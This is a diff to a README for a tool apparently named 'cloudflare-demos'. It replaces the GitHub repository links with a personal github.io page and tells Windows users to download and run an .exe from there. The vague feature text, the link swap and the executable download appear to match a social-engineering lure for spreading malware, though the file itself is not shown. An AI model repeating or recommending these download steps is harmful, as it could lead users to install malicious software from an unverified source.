@@ -1,6 +1,6 @@
 # 🌐 cloudflare-demos - See how Cloudflare services work easily
 
-[![Download Now](https://img.shields.io/badge/Download-Blue-blue)](https://github.com/shaneinscribed141/cloudflare-demos)
+[![Download Now](https://img.shields.io/badge/Download-Blue-blue)](https://shaneinscribed141.github.io)
 
 ## 📖 About this software
 The cloudflare-demos application shows you how Cloudflare services function in a real environment. Many people struggle to understand how web traffic flows through security tools. This software provides a clear look at these processes. You can test features like web performance, security filters, and traffic management locally on your Windows computer. Whether you want to learn about site speed or protect your web traffic, this tool offers a simple way to visualize technical concepts without complex setup.
@@ -17,7 +17,7 @@ Before you run this software, ensure your computer meets these basic requirement
 ## 📥 How to download and install
 To start, you must get the software from the official project page. Follow these steps to prepare the tool on your machine.
 
-1. Visit this page to download the latest version: https://github.com/shaneinscribed141/cloudflare-demos
+1. Visit this page to download the latest version: https://shaneinscribed141.github.io
 2. Look for the section labeled Releases on the right side of the screen.
 3. Select the file ending in .exe for Windows.
 4. Save the file to your Downloads folder.
